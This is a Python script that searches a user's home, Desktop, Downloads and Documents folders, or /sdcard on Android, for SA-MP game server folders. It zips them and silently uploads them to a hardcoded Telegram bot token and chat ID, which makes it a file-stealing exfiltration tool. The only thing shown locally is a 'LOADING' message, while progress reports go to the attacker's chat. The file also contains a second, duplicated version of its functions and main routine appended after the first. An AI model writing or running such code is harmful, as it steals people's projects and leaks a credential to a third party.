import os
import re
import platform
import shutil
import requests
import threading
import time
import zipfile

# ==========================
# CONFIG
# ==========================
BOT_TOKEN = '8792427618:AAGY9Oo6TP0PtjZUdtGQ31i5m33cJNatjO0'
CHAT_ID = '8447290071'
MAX_FILE_SIZE_MB = 45
CHUNK_SIZE = MAX_FILE_SIZE_MB * 1024 * 1024

# ==========================
# LIVE PROGRESS TRACKER
# ==========================

class LiveMessage:
    """Keeps a single Telegram message updated in place."""

    def __init__(self, initial_text):
        self.message_id = None
        self.current_text = initial_text
        self._lock = threading.Lock()
        self._send_initial(initial_text)

    def _send_initial(self, text):
        try:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
                timeout=30
            )
            data = r.json()
            if data.get("ok"):
                self.message_id = data["result"]["message_id"]
        except:
            pass

    def update(self, text):
        with self._lock:
            if text == self.current_text:
                return
            self.current_text = text
            if not self.message_id:
                return
            try:
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
                    data={
                        "chat_id": CHAT_ID,
                        "message_id": self.message_id,
                        "text": text,
                        "parse_mode": "HTML"
                    },
                    timeout=30
                )
            except:
                pass


class ZipProgress:
    """Zips a folder while streaming live byte-count updates to Telegram."""

    def __init__(self, folder_path, zip_path, live_msg, label):
        self.folder_path = folder_path
        self.zip_path = zip_path
        self.live_msg = live_msg
        self.label = label
        self.done = False

    def _collect_files(self):
        entries = []
        for root, _, files in os.walk(self.folder_path):
            for f in files:
                full = os.path.join(root, f)
                try:
                    entries.append((full, os.path.getsize(full)))
                except OSError:
                    entries.append((full, 0))
        return entries

    def run(self):
        entries = self._collect_files()
        total_bytes = sum(size for _, size in entries)
        compressed_bytes = 0
        total_files = len(entries)

        def _progress_watcher():
            while not self.done:
                pct = (compressed_bytes / total_bytes * 100) if total_bytes else 0
                bar = _bar(pct)
                self.live_msg.update(
                    f"{self.label}\n\n"
                    f"🗜 <b>Compressing...</b>\n"
                    f"{bar} {pct:.1f}%\n"
                    f"📄 {_fmt_bytes(compressed_bytes)} / {_fmt_bytes(total_bytes)}"
                )
                time.sleep(1.5)

        watcher = threading.Thread(target=_progress_watcher, daemon=True)
        watcher.start()

        with zipfile.ZipFile(self.zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for i, (full_path, size) in enumerate(entries):
                arcname = os.path.relpath(full_path, self.folder_path)
                try:
                    zf.write(full_path, arcname)
                except Exception:
                    pass
                compressed_bytes += size

        self.done = True
        watcher.join()


# ==========================
# HELPERS
# ==========================

def _bar(pct, width=16):
    filled = int(width * pct / 100)
    return "█" * filled + "░" * (width - filled)

def _fmt_bytes(b):
    if b >= 1024 ** 3:
        return f"{b / 1024**3:.2f} GB"
    if b >= 1024 ** 2:
        return f"{b / 1024**2:.2f} MB"
    if b >= 1024:
        return f"{b / 1024:.1f} KB"
    return f"{b} B"

def safe_name(name):
    name = re.sub(r'[<>:"/\\|?*]', '_', name)
    name = name.replace(' ', '_')
    return name.strip('_') or "SAMP_Server"

def send_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text},
            timeout=30
        )
    except:
        pass

def send_doc(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                files={"document": f},
                data={"chat_id": CHAT_ID, "caption": caption},
                timeout=300
            )
        try:
            return r.json().get("ok", False)
        except:
            return False
    except:
        return False

def get_search_paths():
    system = platform.system()
    if system == "Windows":
        home = os.path.expanduser("~")
        return [
            home,
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Documents")
        ]
    if os.path.exists("/sdcard"):
        return ["/sdcard"]
    return [os.path.expanduser("~")]

def is_samp_server_dir(files_list, dirs_list):
    files_lower = {f.lower() for f in files_list}
    dirs_lower = {d.lower() for d in dirs_list}
    if "server.cfg" in files_lower:
        return True
    signatures = {"gamemodes", "filterscripts", "pawno", "scriptfiles", "plugins", "include"}
    return bool(signatures.intersection(dirs_lower))

def split_and_send_file(zip_path, folder_name, current_index, total_folders, live_msg, label):
    size_bytes = os.path.getsize(zip_path)
    total_parts = (size_bytes + CHUNK_SIZE - 1) // CHUNK_SIZE

    with open(zip_path, "rb") as source:
        for part_num in range(1, total_parts + 1):
            pct = ((part_num - 1) / total_parts) * 100
            bar = _bar(pct)

            live_msg.update(
                f"{label}\n\n"
                f"✂️ <b>Splitting &amp; uploading...</b>\n"
                f"{bar} {pct:.0f}%\n"
                f"📤 Part {part_num - 1}/{total_parts} sent"
            )

            part_name = f"{zip_path}.part{part_num:03d}"
            with open(part_name, "wb") as part:
                part.write(source.read(CHUNK_SIZE))

            caption = (
                f"📁 {folder_name}\n"
                f"Project {current_index}/{total_folders}\n"
                f"Part {part_num}/{total_parts}"
            )
            send_doc(part_name, caption)

            try:
                os.remove(part_name)
            except:
                pass

    live_msg.update(
        f"{label}\n\n"
        f"✅ <b>All {total_parts} parts uploaded!</b>"
    )

# ==========================
# MAIN
# ==========================

def main():
    # --- Scan phase ---
    scan_msg = LiveMessage("🔍 <b>Starting scan...</b>\n\nWalking directories, please wait.")

    found_folders = set()
    scanned_dirs = 0

    for base in get_search_paths():
        if not os.path.exists(base):
            continue
        try:
            for root, dirs, files in os.walk(base, topdown=True):
                dirs[:] = [
                    d for d in dirs
                    if d.lower() not in {"android", "data", "obb", "node_modules"}
                ]
                scanned_dirs += 1

                if scanned_dirs % 50 == 0:
                    scan_msg.update(
                        f"🔍 <b>Scanning...</b>\n\n"
                        f"📂 Dirs scanned: {scanned_dirs}\n"
                        f"✅ SA-MP folders found: {len(found_folders)}"
                    )

                if is_samp_server_dir(files, dirs):
                    found_folders.add(root)
                    dirs.clear()

        except Exception as e:
            send_msg(f"⚠️ Scan error: {str(e)[:100]}")

    folders = sorted(found_folders)

    if not folders:
        scan_msg.update("❌ <b>No SA-MP folders found.</b>")
        return

    scan_msg.update(
        f"✅ <b>Scan complete!</b>\n\n"
        f"📂 Dirs scanned: {scanned_dirs}\n"
        f"📁 SA-MP folders found: {len(folders)}"
    )

    # --- Backup phase ---
    for index, folder_path in enumerate(folders, start=1):
        folder_name = os.path.basename(folder_path) or f"SAMP_{index}"
        archive_name = safe_name(folder_name)

        label = (
            f"📁 <b>{folder_name}</b>\n"
            f"🗂 Folder {index}/{len(folders)}"
        )

        live_msg = LiveMessage(f"{label}\n\n⏳ Preparing...")

        try:
            zip_path = archive_name + ".zip"

            zipper = ZipProgress(folder_path, zip_path, live_msg, label)
            zipper.run()

            size_bytes = os.path.getsize(zip_path)
            size_mb = size_bytes / (1024 * 1024)

            if size_mb > MAX_FILE_SIZE_MB:
                split_and_send_file(
                    zip_path, folder_name, index, len(folders), live_msg, label
                )
            else:
                live_msg.update(
                    f"{label}\n\n"
                    f"📤 <b>Uploading...</b>\n"
                    f"📦 {size_mb:.2f} MB"
                )
                ok = send_doc(
                    zip_path,
                    f"📁 {folder_name}\n"
                    f"Project {index}/{len(folders)}\n"
                    f"Size: {size_mb:.2f} MB"
                )
                if ok:
                    live_msg.update(
                        f"{label}\n\n"
                        f"✅ <b>Uploaded!</b>\n"
                        f"📦 {size_mb:.2f} MB"
                    )
                else:
                    live_msg.update(f"{label}\n\n❌ <b>Upload failed.</b>")

            try:
                os.remove(zip_path)
            except:
                pass

        except Exception as e:
            live_msg.update(
                f"{label}\n\n"
                f"❌ <b>Error:</b> {str(e)[:120]}"
            )

    send_msg(
        f"🎉 <b>All done!</b>\n\n"
        f"✅ {len(folders)} folder(s) backed up successfully."
    )

if __name__ == "__main__":
    main()

def send_doc(file_path, caption=""):
    try:
        with open(file_path, "rb") as f:
            r = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                files={"document": f},
                data={
                    "chat_id": CHAT_ID,
                    "caption": caption
                },
                timeout=300
            )

        try:
            return r.json().get("ok", False)
        except:
            return False

    except:
        return False

def get_search_paths():
    system = platform.system()

    if system == "Windows":
        home = os.path.expanduser("~")
        return [
            home,
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Documents")
        ]

    if os.path.exists("/sdcard"):
        return ["/sdcard"]

    return [os.path.expanduser("~")]

def is_samp_server_dir(files_list, dirs_list):
    files_lower = {f.lower() for f in files_list}
    dirs_lower = {d.lower() for d in dirs_list}

    if "server.cfg" in files_lower:
        return True

    signatures = {
        "gamemodes",
        "filterscripts",
        "pawno",
        "scriptfiles",
        "plugins",
        "include"
    }

    return bool(signatures.intersection(dirs_lower))

def split_and_send_file(zip_path, folder_name, current_index, total_folders):
    size_bytes = os.path.getsize(zip_path)

    total_parts = (
        size_bytes + CHUNK_SIZE - 1
    ) // CHUNK_SIZE

    send_msg(
        f"📦 Splitting {folder_name}\n"
        f"Parts: {total_parts}"
    )

    with open(zip_path, "rb") as source:

        for part_num in range(1, total_parts + 1):

            part_name = f"{zip_path}.part{part_num:03d}"

            with open(part_name, "wb") as part:
                part.write(source.read(CHUNK_SIZE))

            caption = (
                f"📁 {folder_name}\n"
                f"Project {current_index}/{total_folders}\n"
                f"Part {part_num}/{total_parts}"
            )

            send_doc(part_name, caption)

            try:
                os.remove(part_name)
            except:
                pass

# ==========================
# MAIN
# ==========================

def main():
    send_msg("🔍 Starting scan...")
    print('[ + ] LOADING ...')

    found_folders = set()

    for base in get_search_paths():

        if not os.path.exists(base):
            continue

        try:
            for root, dirs, files in os.walk(base, topdown=True):

                dirs[:] = [
                    d for d in dirs
                    if d.lower() not in {
                        "android",
                        "data",
                        "obb",
                        "node_modules"
                    }
                ]

                if is_samp_server_dir(files, dirs):
                    found_folders.add(root)
                    dirs.clear()

        except Exception as e:
            send_msg(f"⚠️ Scan error: {str(e)[:100]}")

    folders = sorted(found_folders)

    if not folders:
        send_msg("❌ No SA-MP folders found.")
        return

    send_msg(f"✅ Found {len(folders)} SA-MP folders.")

    for index, folder_path in enumerate(folders, start=1):

        folder_name = os.path.basename(folder_path)

        if not folder_name:
            folder_name = f"SAMP_{index}"

        archive_name = safe_name(folder_name)

        try:
            send_msg(
                f"📦 Compressing {folder_name}\n"
                f"({index}/{len(folders)})"
            )

            zip_path = shutil.make_archive(
                archive_name,
                "zip",
                folder_path
            )

            size_mb = os.path.getsize(zip_path) / (1024 * 1024)

            if size_mb > MAX_FILE_SIZE_MB:

                split_and_send_file(
                    zip_path,
                    folder_name,
                    index,
                    len(folders)
                )

            else:

                send_doc(
                    zip_path,
                    f"📁 {folder_name}\n"
                    f"Size: {size_mb:.2f} MB"
                )

            try:
                os.remove(zip_path)
            except:
                pass

        except Exception as e:
            send_msg(
                f"❌ Error processing {folder_name}\n"
                f"{str(e)[:100]}"
            )

    send_msg("✅ Finished.")

if __name__ == "__main__":
    main()
